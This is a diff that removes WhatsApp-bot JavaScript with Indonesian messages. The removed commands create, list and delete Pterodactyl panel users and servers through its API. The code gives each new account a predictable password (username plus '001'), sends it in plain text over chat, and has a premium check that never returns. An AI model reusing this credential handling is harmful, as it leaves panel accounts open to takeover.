-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '7gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "7024"
-let cpu = "170"
-let disk = "7024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '8gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "8024"
-let cpu = "180"
-let disk = "8024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '9gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "9024"
-let cpu = "190"
-let disk = "9024"
-let email = username + "zxv@sweetrabit.ml"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case 'unli': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "0"
-let cpu = "0"
-let disk = "0"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case "listsrv": {
-if (!isOwner) return reply(mess.only.owner)
-let page = args[0] ? args[0] : '1';
-let f = await fetch(domain + "/api/application/servers?page=" + page, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-});
-let res = await f.json();
-let servers = res.data;
-let sections = [];
-let messageText = "Berikut adalah daftar server:\n\n";
-
-for (let server of servers) {
-let s = server.attributes;
-
-let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + capikey
-}
-});
-
-let data = await f3.json();
-let status = data.attributes ? data.attributes.current_state : s.status;
-
-messageText += `ID Server: ${s.id}\n`;
-messageText += `Nama Server: ${s.name}\n`;
-messageText += `Status: ${status}\n\n`;
-}
-
-messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
-messageText += `Total Server: ${res.meta.pagination.count}`;
-
-await zyn.sendMessage(m.chat, { text: messageText }, { quoted: m });
-
-if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
-reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
-}
-}
-break;
-
-case "delsrv": {
-if (!isOwner) return reply(mess.only.owner)
-let srv = args[0]
-if (!srv) return reply('ID nya mana?')
-let f = await fetch(domain + "/api/application/servers/" + srv, {
-"method": "DELETE",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-}
-})
-let res = f.ok ? {
-errors: null
-} : await f.json()
-if (res.errors) return reply('Server tidak ditemukan')
-reply('Berhasil minghapus Server.')
-}
-break
- 
-case 'totalfitur': {
-ngaceng = fs.readFileSync("./ZynTzy.js").toString(),
-matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
-caseCount = matches.length,
-caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
-let block = await zyn.fetchBlocklist()
-let gcall = Object.values(await zyn.groupFetchAllParticipating().catch(_=> null))
-let totalCases = caseCount,
-listCases = caseNames.join('\n${prefix} ');
-reply(` *Haii ${pushname}*
-
-𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*`)
 }
 break
 
